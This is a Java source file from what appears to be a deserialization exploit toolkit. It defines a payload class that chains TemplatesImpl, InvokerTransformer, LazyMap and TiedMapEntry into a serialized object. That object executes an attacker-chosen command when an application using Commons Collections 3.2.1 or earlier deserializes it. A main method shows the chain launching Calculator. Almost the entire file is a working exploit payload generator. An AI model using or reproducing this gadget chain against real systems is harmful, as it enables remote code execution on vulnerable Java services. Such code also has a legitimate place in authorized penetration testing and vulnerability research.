package core.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import core.util.Util;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.reflections.Reflections;

import java.util.HashMap;
import java.util.Map;

/**
 * Use CommonsCollectionsK 1~4 to replace CommonsCollections 1~7
 * Dependency: CommonsCollections <= 3.2.1
 */
public class CCK1 implements ObjectPayload{
    @Override
    public Object getObjectPayload(String command) {
        TemplatesImpl templates = Util.createTemplates(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, templates);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();
        Util.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }

    public static void main(String[] args) {
        Util.serialize(new CCK1().getObjectPayload("open -a Calculator"));
    }
}
